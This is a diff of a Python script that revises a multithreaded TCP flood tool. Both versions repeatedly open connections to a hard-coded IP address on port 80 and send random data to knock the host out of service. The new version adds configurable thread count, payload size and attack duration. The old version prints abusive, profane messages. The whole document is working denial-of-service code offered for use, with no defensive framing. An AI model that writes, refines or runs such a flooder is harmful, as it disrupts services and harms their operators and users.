@@ -1,48 +1,54 @@
 import socket
 import threading
+import time
 import random
+import string
 
-# Target IP and port
-ip = "194.193.147.22"
-port = 80
+# Configuration
+TARGET_IP = "194.193.147.22"  # Replace with the target IP address
+TARGET_PORT = 80  # Common port for HTTP traffic
+PAYLOAD_SIZE = 1024  # Size of dummy data to send (in bytes)
+THREADS = 50  # Number of concurrent threads to flood the target
+DURATION = 300  # Duration of the attack in seconds (5 minutes)
 
-# Packet size
-packet_size = 1024
+# Function to generate random dummy data
+def generate_payload(size):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
 
-# Number of threads
-threads = 100
+# Function to flood the target with data
+def flood_target():
+    try:
+        # Create a socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        # Connect to the target
+        sock.connect((TARGET_IP, TARGET_PORT))
+        print(f"Connected to {TARGET_IP}:{TARGET_PORT}")
+        
+        # Send dummy data repeatedly
+        end_time = time.time() + DURATION
+        while time.time() < end_time:
+            payload = generate_payload(PAYLOAD_SIZE)
+            sock.send(payload)
+            time.sleep(0.01)  # Small delay to avoid overwhelming the local system
+    except Exception as e:
+        print(f"Error in thread: {e}")
+    finally:
+        sock.close()
 
-def random_bytes(size):
-    """Generate a bytes object of random bytes"""
-    return bytes([random.randint(0, 255) for _ in range(size)])
+# Main function to start multiple threads
+def start_flood():
+    print(f"Starting flood attack on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads...")
+    threads = []
+    for _ in range(THREADS):
+        thread = threading.Thread(target=flood_target)
+        thread.start()
+        threads.append(thread)
+    
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+    print("Flood attack completed.")
 
-def flood():
-    """Flood the target with TCP packets"""
-    while True:
-        try:
-            # Create a socket
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-            # Set a timeout for the connection attempt
-            sock.settimeout(1)
-
-            # Connect to the target
-            sock.connect((ip, port))
-
-            # Send a packet
-            sock.send(random_bytes(packet_size))
-
-            # Close the socket
-            sock.close()
-            print(f"Fuck yeah, packet sent successfully, you stupid shit! Total packets sent: {threading.active_count()}")
-        except socket.timeout:
-            print(f"Fuck, connection timed out, you damn idiot!")
-        except Exception as e:
-            print(f"Fuck, an error occurred: {e}")
-
-# Create threads
-for _ in range(threads):
-    thread = threading.Thread(target=flood)
-    thread.start()
-
-print("Fuck, the flooding has started, you damn idiot! Press Ctrl+C to stop.")
+if __name__ == "__main__":
+    start_flood()
